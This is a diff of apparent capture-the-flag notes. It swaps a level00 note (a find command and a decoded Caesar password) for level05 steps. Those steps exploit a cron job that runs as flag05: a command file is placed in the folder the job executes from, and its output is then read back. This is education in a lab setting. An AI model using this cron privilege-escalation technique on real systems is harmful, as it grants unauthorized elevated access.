@@ -1,5 +1,14 @@
-find / -user flag00 2>/dev/null
+cat /var/mail/level05 -> */2 * * * * su -c "sh /usr/sbin/openarenaserver" - flag05
 
-find all file owned by user flag00, redirect bad result in /dev/null
+# We see a cron table, that may activate every 2min
 
-Code : cdiiddwpgswtgt, brutforce cesar code, it's 15 -> "nottoohardhere"
+cat /usr/sbin/openarenaserver
+#!/bin/sh
+
+for i in /opt/openarenaserver/* ; do
+	(ulimit -t 5; bash -x "$i") # Exec file "$i" then delete
+	rm -f "$i"
+done
+
+# We test, create a file containing : getflag > /tmp/output
+# the file is deleted 🥵 and we cat the file /tmp/output, OMG THE FLAG IS IN
